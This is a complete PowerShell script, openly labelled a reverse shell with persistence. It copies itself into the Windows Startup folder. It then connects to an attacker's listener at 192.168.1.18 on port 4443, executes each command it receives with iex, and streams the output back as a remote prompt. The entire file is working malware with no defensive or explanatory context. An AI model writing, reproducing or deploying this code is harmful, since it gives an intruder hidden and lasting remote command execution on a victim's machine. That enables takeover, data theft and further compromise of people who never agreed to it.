# code.ps1 - Reverse shell + persistence
# Replace IP and port with your listener
$ip='192.168.1.18'
$port=4443

# --- Persistence: Save to Startup folder ---
$startup="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\code.ps1"
if (-not (Test-Path $startup)) {
    Copy-Item -Path $MyInvocation.MyCommand.Definition -Destination $startup -Force
}

# --- Reverse Shell ---
try {
    $c=New-Object Net.Sockets.TCPClient($ip,$port)
    $s=$c.GetStream()
    [byte[]]$b=0..65535|%{0}
    while(($i=$s.Read($b,0,$b.Length)) -ne 0){
        $d=([Text.Encoding]::ASCII).GetString($b,0,$i)
        $r=iex $d 2>&1 | Out-String
        $r2=$r+'PS '+(pwd).Path+'> '
        $s.Write(([Text.Encoding]::ASCII).GetBytes($r2),0,$r2.Length)
        $s.Flush()
    }
    $c.Close()
} catch {
    Start-Sleep -Seconds 10
}
